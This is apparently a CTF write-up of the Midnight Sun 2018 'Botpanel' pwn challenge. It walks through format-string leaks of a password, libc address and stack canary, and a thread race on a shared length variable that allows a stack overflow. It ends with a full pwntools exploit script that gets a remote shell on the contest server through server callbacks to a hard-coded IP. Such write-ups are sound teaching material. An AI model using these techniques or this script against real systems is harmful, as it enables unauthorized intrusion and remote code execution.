---
title: "Midnight Sun 2018 - Botpanel (Pwn)"
header:
  overlay_image: /assets/images/midnightsun2018/botpanel/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Redd Angelo on Unsplash"

tags:
  - midnightsun2018
  - writeup
  - pwn
---

Multiple vulnerabilties involving formats strings and unsafe threaded access to
shared variables in a 32 bit ELF binary allows an attacker to obtain remote code
execution on a remote system.

A format string vulnerability could be leveraged to leak sensitive information
such as a password, libc addresses, stack canaries, and enable full access to
the features. A second vulnerability leveraging shared variables between two
threads allows the attacker to manipulate the amount of data read and execute a
standard buffer overflow.

## Challenge Description

```
These cyber criminals are selling shells like hot cakes off thier new site. Pwn
their botpanel for us so we can stop them

Service: nc pwn.midnightsunctf.se 31337 | nc 52.30.206.11 31337
```

#### Points

Points: 300

Solves: 19

Author: likvidera

## Solution

First, there is a format string bug in the login:

```shell
		Panel password: %x.%x.%x.%x.%x
		Incorrect! 4 attempts left
		Your attempt was: 4.b.565560c0.5655b008.
		Panel password: 		Incorrect! 3 attempts left
		Your attempt was: 3
b.565560c0.5655b008.
		Panel password:
```

We can leverage this to leak the password from the server:

```shell
		Panel password: %7$s
		Incorrect! 4 attempts left
		Your attempt was: >@!ADMIN!@<
		Panel password:
```

Furthermore, we can get the return address from main in libc with `%43$x` and
the stack canary with `%15$x`.

```shell
                Incorrect! 2 attempts left
%               Your attempt was: f75ea637
                Panel password: 15$x
                Incorrect! 1 attempts left
                Your attempt was: 22f5e800
                Panel password:
```

If we log in, we'd notice that the application is set to trial mode. This means
that we can't use the invite feature.

```shell
MENU [TRIAL MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
>
```

The trial mode byte is checked and set here in the `login` function:

```c
  if ( *(_BYTE *)(a2 + 1) == 'T' )
    trial_mode = 1;
```

To upgrade us to a full user, we can overwrite that address with anything apart
from 'T'.

To do this, we will just leverage the format string vulnerability to write
there.

```shell
		Panel password: %6$n
		Incorrect! 4 attempts left
		Your attempt was:
		Panel password: >@!ADMIN!@<

MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
>
```

Now, we can send invites to two listening netcat sessions.

```shell
MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
> 2
Send an invite to a friendly blackhat!
IP:127.0.0.1

Port:1337

MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
> 2
Send an invite to a friendly blackhat!
IP:127.0.0.1

Port:1336

MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
>
```

We will receive a panel like this on the listeners:

```shell
$ nc -v -l -p 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from [127.0.0.1] port 1337 [tcp/*] accepted (family 2, sport 60484)

MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
>
```

There is a bug with handling feedback. This is the code from `send_feedback`:

```c
unsigned int __cdecl send_feedback(int *a1)
{
  int v2; // [esp+14h] [ebp-44h]
  int v3; // [esp+18h] [ebp-40h]
  char v4; // [esp+1Ch] [ebp-3Ch]
  unsigned int v5; // [esp+4Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  v3 = 0;
  memset(&v4, 0, 0x30u);
  v2 = 0;
  sendstr(*a1, "\nFeedback length: ");
  len_2800 = get_int(a1);
  if ( (unsigned int)len_2800 <= 0x32 )
  {
    sendstr(*a1, "\nFeedback: ");
    recv_until(*a1, (int)&v3, len_2800, 10);
    sendstr(*a1, "\nEdit feedback y/n?: ");
    recv_until(*a1, (int)&v2, 2, 10);
    if ( (_BYTE)v2 == 'y' )
    {
      sendstr(*a1, "\nFeedback: ");
      recv_until(*a1, (int)&v3, len_2800, 10);
    }
  }
  else
  {
    sendstr(*a1, "\nFeedback length is incorrect!\n");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

Since each session is running on a thread, they both share certain resources
and variables such as the variable `len_2800`. This means that if we can
interleave the order of which instructions get executed between the two
sessions, we can potentially read as much data into the stack and control the
instruction pointer. The stack canary will not pose a problem for us since we
already leaked it with the format string vulnerability.

To perform the next step, we have to send feedback on both sessions. In the
first session, we specify a legitimate length for the feedback and hold when it
asks if we want to re-enter it.

```shell
MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
> 3

Feedback length: 32

Feedback: AAAA

Edit feedback y/n?:
```

On the other session, we can specify a very large length to read and manipulate
the `len_2800` variable.

```shell
MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
> 3

Feedback length: 999

Feedback length is incorrect!

MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
>
```

Back on the first session, we can now overflow the stack buffer.

```shell
Edit feedback y/n?: y

Feedback: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

The program crashes:

```shell
MENU [REGISTERED MODE]
 1) Show available bots
 2) Send invite
 3) Send feedback
 4) Quit
> *** stack smashing detected ***: ./botpanel_e0117db42051bbbe6a9c5db571c45588 terminated
Aborted (core dumped)
```

The final exploit script:

```python
from pwn import *
import time

context.log_level = "debug"

CALLBACK_IP = "192.241.156.223"
CALLBACK_PORT1 = 1337
CALLBACK_PORT2 = 1336

# Local Offsets
offset___libc_start_main_ret = 0x18637
offset_system = 0x0003ada0
offset_dup2 = 0x000d6310
offset_read = 0x000d5b00
offset_write = 0x000d5b70
offset_str_bin_sh = 0x15ba0b
offset_puts = 0x0005fca0
offset_exit = 0x0002e9d0
offset_read = 0x000d5b00

# Remote offsets
offset___libc_start_main_ret = 0x18637
offset_system = 0x0003a940
offset_dup2 = 0x000d4b50
offset_read = 0x000d4350
offset_write = 0x000d43c0
offset_str_bin_sh = 0x15902b
offset_puts = 0x0005f140
offset_exit = 0x0002e7b0
offset_read = 0x000d4350

# Password at %7$s
# Modify Trial at %6$n
# libc Leak at %43$x
# Canary Leak at %15$x

def main():
    #p = process(["./botpanel_e0117db42051bbbe6a9c5db571c45588", "0"])
    p = remote("52.30.206.11", 31337)

    payload_leak_password = "%7$s.AAA"
    p.sendline(payload_leak_password)
    p.recvuntil("Your attempt was: ")
    password = p.recvuntil(".AAA")[:-4]
    log.info("Password: '%s'." % password)

    payload_modify_trial = "%6$n.AAA"
    p.sendline(payload_modify_trial)
    p.recvuntil(".AAA")
    log.info("Upgraded to registered.")

    payload_leak_libc = "%43$x.AAA"
    p.sendline(payload_leak_libc)
    p.recvuntil("Your attempt was: ")
    libc_leak = int(p.recvuntil(".AAA")[:-4], 16)
    libc = libc_leak - offset___libc_start_main_ret
    system_addr = libc + offset_system
    binsh_addr = libc + offset_str_bin_sh
    exit_addr = libc + offset_exit
    log.info("Libc Base at 0x%x." % libc)
    log.info("system@Libc at 0x%x." % system_addr)
    log.info("'/bin/sh'@libc at 0x%x" % binsh_addr)
    log.info("exit@libc at 0x%x" % binsh_addr)

    payload_leak_canary = "%15$x.AAA"
    p.sendline(payload_leak_canary)
    p.recvuntil("Your attempt was: ")
    canary = int(p.recvuntil(".AAA")[:-4], 16)
    log.info("Canary is %x" % canary)

    p.sendline(password)
    p.recvuntil(">")
    log.info("Logged in.")

    r1 = listen(CALLBACK_PORT1)
    r2 = listen(CALLBACK_PORT2)
    log.info("Callback listeners set up.")

    time.sleep(0.5)

    p.sendline("2")
    p.recvuntil("IP:")
    p.sendline(CALLBACK_IP)
    p.recvuntil("Port:")
    p.sendline(str(CALLBACK_PORT1))
    p.recvuntil(">")
    log.info("Triggered an invite to %s:%d." % (CALLBACK_IP, CALLBACK_PORT1))

    p.sendline("2")
    p.recvuntil("IP:")
    p.sendline(CALLBACK_IP)
    p.recvuntil("Port:")
    p.sendline(str(CALLBACK_PORT2))
    p.recvuntil(">")
    log.info("Triggered an invite to %s:%d." % (CALLBACK_IP, CALLBACK_PORT2))

    r1.sendline("3")
    r1.recvuntil("Feedback length:")
    r1.sendline("32")
    r1.recvuntil("Feedback:")
    r1.sendline("AAAA")
    r1.recvuntil("Edit feedback y/n?:")
    log.info("Triggered a legitimate send feedback from R1. Waiting for R2.")

    r2.sendline("3")
    r2.recvuntil("Feedback length:")
    r2.send("9999")
    #r2.sendline("4")  # Remote server dies if thread exits
    log.info("R2 has overwritten the shared length.")

    r1.sendline("y")
    r1.recvuntil("Feedback:")
    payload = "A"*52
    payload += p32(canary)
    payload += "B"*12
    payload += p32(system_addr)
    payload += p32(exit_addr)
    payload += p32(binsh_addr)
    r1.sendline(payload)
    #r1.sendline("4")
    log.info("Overflow in R1 triggered.")

    p.recvrepeat(0.5)
    p.sendline("4")
    context.log_level = "info"
    log.success("Enjoy your shell.")

    p.interactive()


if __name__ == "__main__":
    main()
```

Running it:

```shell
...
[*] Overflow in R1 triggered.
[DEBUG] Sent 0x2 bytes:
    '4\n'
[+] Enjoy your shell.
[*] Switching to interactive mode
$ ls -la
total 52
drwxr-xr-x 1 root ctf   4096 Apr  7 15:31 .
drwxr-xr-x 1 root root  4096 Apr  7 15:31 ..
-rwxr-x--- 1 root ctf  28812 Apr  7 15:27 chall
-r--r----- 1 root ctf     13 Apr  7 15:27 config
-r--r----- 1 root ctf     52 Apr  7 15:27 flag
-rwxr-x--- 1 root ctf     39 Apr  7 15:27 redir.sh
$ cat flag
midnight{d0nt_d0_th3_cr1m3_1f_y0u_c4nt_d0_th3_t1m3}
$
```

Flag: **midnight{d0nt\_d0\_th3\_cr1m3\_1f\_y0u_c4nt\_d0_th3\_t1m3}**

